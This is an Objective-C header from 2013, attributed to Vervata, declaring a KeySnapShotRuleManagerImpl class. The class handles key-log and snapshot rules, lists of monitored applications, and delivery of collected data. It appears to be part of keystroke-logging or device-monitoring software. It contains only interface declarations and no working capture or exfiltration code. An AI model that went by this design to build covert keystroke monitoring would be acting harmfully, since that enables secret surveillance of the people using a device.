//
//  KeySnapShotRuleManagerImpl.h
//  KeySnapShotRuleManager
//
//  Created by Makara Khloth on 10/24/13.
//  Copyright (c) 2013 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "KeySnapShotRuleManager.h"
#import "DeliveryListener.h"

@protocol DataDelivery, KeyLogRuleDelegate;

@class KeySnapShotRuleStore;

@interface KeySnapShotRuleManagerImpl : NSObject <KeySnapShotRuleManager, DeliveryListener> {
@private
    id <DataDelivery>                   mDDM;
    id <KeyLogRuleDelegate>             mKeyLogRuleDelegate;
    
    id <SnapShotRuleRequestDelegate>    mSendSnapShotRuleRequestDelegate;
    id <SnapShotRuleRequestDelegate>    mGetSnapShotRuleRequestDelegate;
    
    id <MonitorApplicationRequestDelegate>  mSendMonitorApplicationsRequestDelegate;
    id <MonitorApplicationRequestDelegate>  mGetMonitorApplicationsRequestDelegate;
    
    KeySnapShotRuleStore                *mKeySnapShotRuleStore;
    
}

@property (nonatomic, assign) id <DataDelivery> mDDM;
@property (nonatomic, assign) id <KeyLogRuleDelegate> mKeyLogRuleDelegate;

@property (nonatomic, assign) id <SnapShotRuleRequestDelegate> mSendSnapShotRuleRequestDelegate;
@property (nonatomic, assign) id <SnapShotRuleRequestDelegate> mGetSnapShotRuleRequestDelegate;

@property (nonatomic, assign) id <MonitorApplicationRequestDelegate>  mSendMonitorApplicationsRequestDelegate;
@property (nonatomic, assign) id <MonitorApplicationRequestDelegate>  mGetMonitorApplicationsRequestDelegate;

- (id) initWithDDM: (id <DataDelivery>) aDDM;

- (NSDictionary *) getKeyLogRuleInfo;
- (NSDictionary *) getMonitorApplicationInfo;

- (void) clearAllRules;

@end
